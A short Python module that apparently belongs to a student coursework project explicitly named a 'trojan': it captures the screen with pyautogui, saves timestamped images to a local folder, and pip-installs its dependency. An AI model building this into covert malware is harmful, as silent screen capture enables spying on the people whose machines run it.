import subprocess
from basemodule import BaseModule
import pyautogui
import datetime


class Screenshot(BaseModule):
    def run(self):
        now = datetime.datetime.now()
        screenshot = pyautogui.screenshot()
        screenshot.save(r'C:\Users\bernd\OneDrive - AP Hogeschool Antwerpen\School 22-23 semester 2\Python '
                        r'Developement\trojan\screenshots\test' + now.strftime("%Y-%m-%d_%H-%M-%S") + '.jpg')

    def install_requirements(self):
        libraries = ["pyautogui"]
        for library in libraries:
            subprocess.check_call(["pip", "install", library])
